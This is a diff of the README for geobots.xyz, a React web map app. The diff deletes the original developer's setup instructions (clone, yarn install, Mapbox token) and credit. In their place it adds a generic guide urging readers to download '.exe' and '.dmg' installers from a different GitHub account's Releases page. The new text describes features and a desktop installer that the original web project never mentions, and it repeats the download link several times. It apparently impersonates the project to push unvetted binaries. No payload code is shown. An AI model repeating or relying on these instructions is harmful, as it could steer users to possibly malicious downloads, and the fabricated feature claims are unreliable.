@@ -1,91 +1,84 @@
-# GeoBots.xyz - Geolocation Intelligence Embedded into Maps
-
-An interactive web map showing snippets of the world at any location, with adjustable "boundaries" and the ability to toggle between a circle and actual walking distances using Mapbox isochrone API.
-
-This project is open-source. All the code and interface is created from scratch with the fewest external libraries possible, and the objective is to be a base for AI applications.
-
----
-
-## 🌐 Live Demo
-
-**Try it now:** [https://geobots.xyz/](https://geobots.xyz/)
-
----
-
-## ✨ Key Features
-
-* **Global Support**: Explore worldwide.
-* **Interactive Map**: Simply click anywhere to instantly find the layers you want.
-* **Adjustable Boundaries**: Easily choose to display between circle and walking distances.
-* **Ultra-High Performance**: Optimized React application with minimal dependencies.
-* **Modern Frontend**: Built with React 19, TypeScript, and Sass.
-
----
-
----
+# 🌍 geobots.xyz - Your Tool for Map Visualization
 
 ## 🚀 Getting Started
 
-These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.
+Welcome to geobots.xyz, an open source tool designed to help you visualize data on maps with ease. This guide will walk you through the process to download and run the application.
 
-### Prerequisites
+## 📥 Download Now
 
-* **Node**
+[![Download geobots.xyz](https://img.shields.io/badge/Download-geobots.xyz-blue)](https://github.com/tusharrr46/geobots.xyz/releases)
 
-### Installation
+## 🌟 Features
 
-1.  **Clone the repository:**
-    ```bash
-    git clone [https://github.com/hvoking/geobots.xyz.git](https://github.com/hvoking/geobots.xyz.git)
-    cd geobots
-    ```
+- **User-Friendly Interface**: Navigate with ease using our simple layout.
+- **Real-Time Data Visualizations**: See data represented dynamically on maps.
+- **Customizable Options**: Tailor the application to your preferences.
+- **Open Source**: Contribute to our project or modify it for your needs.
 
-2.  **Install dependencies:**
-    ```bash
-    yarn install
-    ```
+## 💻 System Requirements
 
-3.  **Set up environment variables:**
-    ```bash
-    cp .env.example .env
-    ```
-    Then add your Mapbox API key to the `.env` file (see Setup section below).
+Before you install geobots.xyz, ensure your computer meets these requirements:
 
-4.  **Start the development server:**
-    ```bash
-    yarn start
-    ```
-    Visit `http://localhost:3000`
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a popular Linux distribution.
+- **Processor**: Intel i3 or equivalent.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum 100 MB of free space.
 
----
+## 🛠️ Installation Steps
 
-## 🔑 Mapbox API Setup
+### 1. Visit the Releases Page
 
-1. **Create a Mapbox account** at [mapbox.com](https://account.mapbox.com/auth/signup/)
-2. **Get your access token** from [your account page](https://account.mapbox.com/access-tokens/)
-3. **Add the token to your `.env` file:**
-   ```
-   REACT_APP_MAPBOX_TOKEN=your_actual_token_here
-   ```
+To get started, click the link below to visit the Releases page where you can download the latest version of geobots.xyz.
 
-## 📂 Project Structure
-* `src/app/` - Main application components
-    * `panel/` - Left sidebar with logo and menu sections
-    * `map/` - Core mapping interface with boundary tools and markers
-    * `tools/` - Map interaction tools (cursor, location, search)
-    * `views/` - Different view modes (agents, basemaps, features)
-* `src/context/` - React Context for global state management
-* `src/utils/` - Utility functions for geometry, mapping, and UI components
+[Download geobots.xyz](https://github.com/tusharrr46/geobots.xyz/releases)
 
----
+### 2. Choose Your Version
 
-## 🤝 Contributing
+On the Releases page, you will see a list of available versions. Look for the latest stable release at the top of the list. 
 
-Contributions are welcome! If you have suggestions for improvements, new features, or bug fixes, please open an issue or submit a pull request.
+### 3. Download the Application
 
----
+Once you've identified the version you want to install, click on the appropriate link for your operating system. This will typically be labeled as "geobots.xyz.exe" for Windows users or "geobots.xyz.dmg" for macOS users.
 
-## 👨‍💻 Created By
+### 4. Install the Application
 
-**Gustavo Gonzalez - Urban Geometry**
-Architect and Urbanist [Urban Geometry]
+After the download completes, locate the file in your downloads folder. 
+
+- **For Windows**: Double-click on the `.exe` file. Follow the prompts to complete the installation.
+
+- **For macOS**: Open the `.dmg` file. Drag the geobots.xyz application into your Applications folder.
+
+- **For Linux**: Follow your distribution's method for installing a downloaded application.
+
+## 🖥️ Running geobots.xyz
+
+### 1. Open the Application
+
+Once installed, find geobots.xyz in your applications list or desktop and double-click to open it.
+
+### 2. Explore the Interface
+
+The application will present a main menu with options. You can choose to load your data or explore built-in demos for visualization examples.
+
+### 3. Load Your Data
+
+To start visualizing, click on the "Load Data" button. Select your data file to begin. Supported formats include CSV and JSON.
+
+## 📝 Tips for Using geobots.xyz
+
+- **Use Clear Data**: Ensure your data is clean and well-structured for the best results.
+- **Experiment with Features**: Utilize different visualization options to see how your data changes.
+- **Save Your Work**: Regularly save your visualizations to return to them later. Use the "Save" option in the menu.
+
+## 🆘 Getting Help
+
+If you encounter issues or have questions, please refer to the support section in the app or visit our GitHub Discussions page.
+
+## 🔗 Resources
+
+- [GitHub Repository](https://github.com/tusharrr46/geobots.xyz)
+- [Documentation](https://github.com/tusharrr46/geobots.xyz/blob/main/docs/USER_GUIDE.md)
+  
+Download geobots.xyz using the link below and start visualizing your data today!
+
+[Download geobots.xyz](https://github.com/tusharrr46/geobots.xyz/releases)
